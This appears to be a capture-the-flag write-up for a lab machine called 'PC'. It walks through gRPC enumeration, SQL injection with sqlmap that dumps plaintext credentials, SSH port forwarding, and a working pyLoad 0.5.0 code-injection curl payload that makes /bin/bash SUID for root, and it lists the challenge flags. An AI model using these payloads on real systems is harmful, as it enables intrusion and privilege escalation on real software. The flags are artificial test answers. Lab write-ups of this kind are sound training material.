# PC

## Reconnaissance

### Nmap

```c
$ sudo nmap -A -T4 -sC -sV 10.129.182.105
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 21:40 UTC
Nmap scan report for 10.129.182.105
Host is up (0.12s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (92%), Linux 5.3 - 5.4 (91%), Linux 5.0 (90%), Crestron XPanel control system (90%), Linux 5.0 - 5.4 (90%), Linux 2.6.32 (90%), Linux 5.0 - 5.3 (89%), Linux 5.4 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   146.26 ms 10.10.16.1
2   146.14 ms 10.129.182.105

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.21 seconds
```

```c
$ sudo nmap -A -T4 -sC -sV -p- 10.129.182.105
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 21:42 UTC
Nmap scan report for 10.129.182.105
Host is up (0.12s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.93%I=7%D=5/20%Time=64693F21%P=x86_64-pc-linux-gnu%r(N
SF:ULL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x0
SF:6\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(Generic
SF:Lines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GetRe
SF:quest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(HTTPO
SF:ptions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0
SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RTSP
SF:Request,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\
SF:0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RPC
SF:Check,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(DNSVe
SF:rsionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\
SF:xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0
SF:")%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0
SF:\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\
SF:0\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0
SF:\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\
SF:0\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x0
SF:5\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0
SF:\?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?
SF:\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x0
SF:8\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
SF:0\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
SF:0\0\0\0\0\0\?\0\0")%r(X11Probe,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff
SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\
SF:0\0\0\0\0\?\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (92%), Linux 5.0 - 5.4 (91%), Linux 5.3 - 5.4 (91%), Linux 2.6.32 (91%), Linux 5.0 (90%), Linux 5.0 - 5.3 (90%), Linux 5.4 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   95.12 ms  10.10.16.1
2   142.10 ms 10.129.182.105

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 133.20 seconds
```

```c
$ sudo nmap -sV -sU 10.129.181.224
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 21:53 UTC
Nmap scan report for 10.129.181.224
Host is up (0.048s latency).
All 1000 scanned ports on 10.129.181.224 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5021.78 seconds
```

### Enumeration of Port 50051/TCP

> https://grpc.io/

> https://stackoverflow.com/questions/56087157/how-does-one-send-a-rest-request-to-an-annotated-grpc-endpoint

```c
$ nc 10.129.182.105 50051 | xxd
00000000: 0000 1804 0000 0000 0000 0400 3fff ff00  ............?...
00000010: 0500 3fff ff00 0600 0020 00fe 0300 0000  ..?...... ......
00000020: 0100 0004 0800 0000 0000 003f 0000 0000  ...........?....
00000030: 4007 0000 0000 0000 0000 0000 0000 0244  @..............D
00000040: 6964 206e 6f74 2072 6563 6569 7665 2048  id not receive H
00000050: 5454 502f 3220 7365 7474 696e 6773 2062  TTP/2 settings b
00000060: 6566 6f72 6520 6861 6e64 7368 616b 6520  efore handshake 
00000070: 7469 6d65 6f75 74                        timeout
```

> https://github.com/fullstorydev/grpcurl

```c
$ go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
go: downloading github.com/fullstorydev/grpcurl v1.8.7
go: downloading github.com/jhump/protoreflect v1.12.0
go: downloading google.golang.org/grpc v1.48.0
go: downloading golang.org/x/net v0.0.0-20201021035429-f5854403a974
go: downloading google.golang.org/genproto v0.0.0-20200526211855-cb27e3aa2013
go: downloading github.com/envoyproxy/go-control-plane v0.10.2-0.20220325020618-49ff273808a1
go: downloading golang.org/x/sys v0.0.0-20210119212857-b64e53b001e4
go: downloading github.com/cespare/xxhash/v2 v2.1.1
go: downloading github.com/cncf/udpa/go v0.0.0-20210930031921-04548b0d99d4
go: downloading github.com/cncf/xds/go v0.0.0-20211011173535-cb28da3451f1
go: downloading github.com/envoyproxy/protoc-gen-validate v0.1.0
go: downloading golang.org/x/text v0.3.7
go: downloading golang.org/x/oauth2 v0.0.0-20200107190931-bf48bf16ab8d
go: downloading github.com/census-instrumentation/opencensus-proto v0.2.1
go: downloading cloud.google.com/go v0.56.0
```

```c
$ go/bin/grpcurl -plaintext 10.129.182.105:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection
```

```c
$ go/bin/grpcurl -plaintext 10.129.182.105:50051 describe SimpleApp
SimpleApp is a service:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}
```

```c
$ go/bin/grpcurl -plaintext 10.129.182.105:50051 SimpleApp/RegisterUser 
{
  "message": "username or password must be greater than 4"
}
```

```c
$ go/bin/grpcurl -plaintext -d '{"username":"foobar","password":"foobar"}' 10.129.182.105:50051 SimpleApp/RegisterUser
{
  "message": "Account created for user foobar!"
}
```

```c
$ go/bin/grpcurl -plaintext -d '{"username":"foobar","password":"foobar"}' 10.129.182.105:50051 SimpleApp/LoginUser   
{
  "message": "Your id is 153."
}
```

> https://github.com/fullstorydev/grpcui

```c
$ go/bin/grpcui -plaintext 10.129.182.105:50051                        
gRPC Web UI available at http://127.0.0.1:45849/
```

I logged in by using `Method name: LoginUser`, checked `username` and `password`, inserted my credentials `foobar:foobar` and send it via `Invoke`.

I had to repeat the steps because I think my user got deleted. So I repeated the `registration` and `login` via the `GUI`.

Then I received a `JSON Web Token (JWT)`.

Method name: RegisterUser

| Username | Password |
| --- | --- |
| foobar | foobar |

```c
{
  "message": "Account created for user test!"
}
```

Method name: LoginUser

| Username | Password |
| --- | --- |
| foobar | foobar |

```c
{
  "message": "Your id is 131."
}
```

Response Trailers:

| Value 1 | Value 2 |
| --- | --- |
| token | b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4NDYzMDk2OX0.OZvcaQK3IRDMtpE_32-EPY8LtTb_Me6Ndm4uunFni8s' |

## SQL Injection (SQLi)

We selected the method name `getInfo` and checked the box for `id`.

For authentication we set the following `Request Metadata`.

| Name | Value |
| --- | --- |
| token | b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4NDYzMDk2OX0.OZvcaQK3IRDMtpE_32-EPY8LtTb_Me6Ndm4uunFni8s' |

Method name: getInfo

Payload:

```c
9999 union select 2
```

RAW Requst (JSON)

```c
{
  "id": "9999 union select 2"
}
```

Then we intercepted the request with `*` as `id` and send it to `Burp Suite`.

Request:

```c
POST /invoke/SimpleApp.getInfo HTTP/1.1
Host: 127.0.0.1:45849
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-grpcui-csrf-token: eS4Q0-DscyWPZv9cAfgLC30kTmXmIY6yN1zWhw1AH2Y
X-Requested-With: XMLHttpRequest
Content-Length: 208
Origin: http://127.0.0.1:45849
DNT: 1
Connection: close
Referer: http://127.0.0.1:45849/
Cookie: _grpcui_csrf_token=eS4Q0-DscyWPZv9cAfgLC30kTmXmIY6yN1zWhw1AH2Y
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Sec-GPC: 1

{"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4NDYzMDk2OX0.OZvcaQK3IRDMtpE_32-EPY8LtTb_Me6Ndm4uunFni8s"}],"data":[{"id":"*"}]}
```

## sqlmap

```c
$ sqlmap -r request.req --level 5 --risk 3 --batch
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[(]_____ ___ ___  {1.7.2#stable}                                                                                                                                                                                                    
|_ -| . [.]     | .'| . |                                                                                                                                                                                                                   
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:30:06 /2023-05-20/

[22:30:06] [INFO] parsing HTTP request from 'request.req'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter '_grpcui_csrf_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[22:30:06] [INFO] testing connection to the target URL
[22:30:06] [INFO] testing if the target URL content is stable
[22:30:07] [INFO] target URL content is stable
[22:30:07] [INFO] testing if (custom) POST parameter 'JSON #1*' is dynamic
[22:30:07] [INFO] (custom) POST parameter 'JSON #1*' appears to be dynamic
[22:30:07] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON #1*' might not be injectable
[22:30:07] [INFO] testing for SQL injection on (custom) POST parameter 'JSON #1*'
[22:30:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:30:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[22:30:12] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable 
[22:30:13] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[22:30:13] [INFO] testing 'Generic inline queries'
[22:30:13] [INFO] testing 'SQLite inline queries'
[22:30:13] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[22:30:14] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[22:30:14] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[22:30:14] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
[22:30:14] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query - comment)'
[22:30:14] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query - comment)'
[22:30:14] [INFO] testing 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)'
[22:30:19] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)' injectable 
[22:30:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:30:19] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:30:21] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[22:30:22] [INFO] target URL appears to be UNION injectable with 1 columns
[22:30:22] [INFO] (custom) POST parameter 'JSON #1*' is 'Generic UNION query (random number) - 1 to 20 columns' injectable
[22:30:22] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
(custom) POST parameter 'JSON #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 158 HTTP(s) requests:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4NDYzMDk2OX0.OZvcaQK3IRDMtpE_32-EPY8LtTb_Me6Ndm4uunFni8s"}],"data":[{"id":"-3373 OR 7337=7337"}]}

    Type: time-based blind
    Title: SQLite > 2.0 time-based blind - Parameter replace (heavy query)
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4NDYzMDk2OX0.OZvcaQK3IRDMtpE_32-EPY8LtTb_Me6Ndm4uunFni8s"}],"data":[{"id":"(SELECT LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))"}]}

    Type: UNION query
    Title: Generic UNION query (random number) - 3 columns
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4NDYzMDk2OX0.OZvcaQK3IRDMtpE_32-EPY8LtTb_Me6Ndm4uunFni8s"}],"data":[{"id":"-1729 UNION ALL SELECT CHAR(113,112,120,107,113)||CHAR(73,117,84,103,120,115,66,88,120,69,82,87,110,66,122,70,66,76,88,75,108,102,121,115,69,87,105,79,84,76,89,111,99,116,97,76,68,73,106,81)||CHAR(113,112,122,120,113)-- yIav"}]}
---
[22:30:22] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[22:30:22] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 22:30:22 /2023-05-20/
```

```c
$ sqlmap -r request.req --level 5 --risk 3 --dump --batch
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[(]_____ ___ ___  {1.7.2#stable}                                                                                                                                                                                                    
|_ -| . [.]     | .'| . |                                                                                                                                                                                                                   
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:30:50 /2023-05-20/

[22:30:50] [INFO] parsing HTTP request from 'request.req'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter '_grpcui_csrf_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[22:30:51] [INFO] resuming back-end DBMS 'sqlite' 
[22:30:51] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4NDYzMDk2OX0.OZvcaQK3IRDMtpE_32-EPY8LtTb_Me6Ndm4uunFni8s"}],"data":[{"id":"-3373 OR 7337=7337"}]}

    Type: time-based blind
    Title: SQLite > 2.0 time-based blind - Parameter replace (heavy query)
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4NDYzMDk2OX0.OZvcaQK3IRDMtpE_32-EPY8LtTb_Me6Ndm4uunFni8s"}],"data":[{"id":"(SELECT LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))"}]}

    Type: UNION query
    Title: Generic UNION query (random number) - 3 columns
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4NDYzMDk2OX0.OZvcaQK3IRDMtpE_32-EPY8LtTb_Me6Ndm4uunFni8s"}],"data":[{"id":"-1729 UNION ALL SELECT CHAR(113,112,120,107,113)||CHAR(73,117,84,103,120,115,66,88,120,69,82,87,110,66,122,70,66,76,88,75,108,102,121,115,69,87,105,79,84,76,89,111,99,116,97,76,68,73,106,81)||CHAR(113,112,122,120,113)-- yIav"}]}
---
[22:30:51] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[22:30:51] [INFO] fetching tables for database: 'SQLite_masterdb'
[22:30:51] [INFO] fetching columns for table 'accounts' 
[22:30:51] [INFO] fetching entries for table 'accounts'
Database: <current>
Table: accounts
[2 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
+------------------------+----------+

[22:30:51] [INFO] table 'SQLite_masterdb.accounts' dumped to CSV file '/home/user/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/accounts.csv'
[22:30:51] [INFO] fetching columns for table 'messages' 
[22:30:52] [INFO] fetching entries for table 'messages'
Database: <current>
Table: messages
[1 entry]
+----+----------------------------------------------+----------+
| id | message                                      | username |
+----+----------------------------------------------+----------+
| 1  | The admin is working hard to fix the issues. | admin    |
+----+----------------------------------------------+----------+

[22:30:52] [INFO] table 'SQLite_masterdb.messages' dumped to CSV file '/home/user/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/messages.csv'
[22:30:52] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 22:30:52 /2023-05-20/
```

| Username | Password |
| --- | --- |
| sau | HereIsYourPassWord1431 |

```c
$ ssh sau@10.129.182.105
The authenticity of host '10.129.182.105 (10.129.182.105)' can't be established.
ED25519 key fingerprint is SHA256:63yHg6metJY5dfzHxDVLi4Zpucku6SuRziVLenmSmZg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.182.105' (ED25519) to the list of known hosts.
sau@10.129.182.105's password: 
Last login: Mon May 15 09:00:44 2023 from 10.10.14.19
sau@pc:~$
```

## user.txt

```c
sau@pc:~$ cat user.txt
94f3b1754a588c3dd496c4b23d971799
```

## Enumeration

```c
sau@pc:~$ id
uid=1001(sau) gid=1001(sau) groups=1001(sau)
```

```c
sau@pc:~$ sudo -l
[sudo] password for sau: 
Sorry, user sau may not run sudo on localhost.
```

```c
sau@pc:~$ ss -tuln
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                   
udp                     UNCONN                   0                        0                                          127.0.0.53%lo:53                                              0.0.0.0:*                                                
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                       127.0.0.53%lo:53                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        5                                              127.0.0.1:8000                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                              0.0.0.0:9666                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                                 [::]:22                                                 [::]:*                                                
tcp                     LISTEN                   0                        4096                                                   *:50051                                                 *:*
```

## Port Forwarding for Port 8000/TCP

```c
sau@pc:~$ mkdir .ssh
sau@pc:~$ cd .ssh
sau@pc:~/.ssh$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDAiZ0BuXmspO/KEZqHsGB6jfgR9MxK9uRqSInr+uEitc/Qgg6UjMx7acdim1oMazprDLSHnYGf/SCA8C2/G6sEwTmMzRVlLc0BY4nOa01oi7j1AUDZPu1O8tbPLZSTaxaTPeKLlVjmp6isdiwvFcIvcvfo9TvKUK4S5QXnIPAdEv/B+glmiOsZS8QZiPpkSlhvoW1zXkfSemwDrhyiFt44UgV92ji3du52yck1AJ6/XIBs/jODUod/wZdjsxLTSv4AhyplLQno68rNU7+fXduO6jnaJQ9ijz8B9KHSdzvn67NWiqZoJoUKJvUnuHtjP5IiXlvfu+VkhtKnR1tEiJUD5iCvfodvAvWmO4QTUgVX8YNY4wWJCs4Pwxg8N64bdsGxdkK4FwcBSMt/K1nkGxUXDEtX1pZpd1UFJJmxycVJCRu9cdr/tBl89/Bx3iYlfaPdr8cgZO5kC8I/r9KPI/hkPQk19JLg4+A/w4hysGGyHM4NZRUVmRHzlJMfdkXKjywHHMAEhthmPmAU84LLbl74BlRoj4cY245QviCIx9JbPtREbn/y1QIbPkExzqaOZbt9W4X8vuFybj5qqHb0P8DXGon91ISIhyuGB52B3XW6IoogYtYdS4HvCJmPjitfPwHWkNTqdZzOfMIAfYIuwwZkxp6Ha8S2xNrpf0hHYM5syQ==' > authorized_keys
```

```c
$ ssh -L 8000:127.0.0.1:8000 sau@10.129.182.105
sau@10.129.182.105's password: 
Last login: Sat May 20 22:31:16 2023 from 10.10.16.3
sau@pc:~$
```

> http://127.0.0.1:8000/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F

```c
sau@pc:~$ pyload --version
pyLoad 0.5.0
```

## Privilege Escalation

> https://security.snyk.io/package/pip/pyload-ng

Payload:

```c
sau@pc:~$ curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"chmod%20%2Bs%20%2Fbin%2Fbash\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://127.0.0.1:8000/flash/addcrypted2'
```

```c
sau@pc:~$ curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"chmod%20%2Bs%20%2Fbin%2Fbash\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://127.0.0.1:8000/flash/addcrypted2'
HTTP/1.1 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
Content-Length: 21
Access-Control-Max-Age: 1800
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: OPTIONS, GET, POST
Vary: Accept-Encoding
Date: Sat, 20 May 2023 22:38:28 GMT
Server: Cheroot/8.6.0

Could not decrypt key
```

```c
sau@pc:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

```c
sau@pc:~$ /bin/bash -p
bash-5.0#
```

## root.txt

```c
bash-5.0# cat /root/root.txt
3322dea2c5bcdb2fd040a0f8a059c8e5
```
